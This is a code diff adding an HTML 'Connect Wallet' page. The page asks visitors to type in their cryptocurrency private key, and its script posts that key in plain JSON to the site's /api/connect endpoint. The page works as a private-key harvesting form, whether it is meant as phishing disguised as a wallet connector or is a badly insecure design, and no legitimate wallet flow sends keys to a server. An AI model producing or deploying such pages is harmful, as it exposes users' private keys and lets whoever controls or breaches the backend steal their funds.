@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+</head>
+<body>
+<h1>Connect Wallet</h1>
+<input type="text" id="private-key" placeholder="Enter private key">
+<button id="connect-wallet-button">Connect Wallet</button>
+
+<script>
+    async function connectWallet() {
+        const privateKey = document.getElementById('private-key').value;
+        try {
+            const response = await fetch('/api/connect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ privateKey: privateKey })
+            });
+            const result = await response.json();
+            if (response.ok) {
+                alert(`Wallet connected: ${result.address}`);
+            } else {
+                alert(`Error: ${result.error}`);
+            }
+        } catch (error) {
+            console.error('Error connecting wallet:', error);
+        }
+    }
+
+    document.getElementById('connect-wallet-button').addEventListener('click', connectWallet);
+</script>
+</body>
+</html>
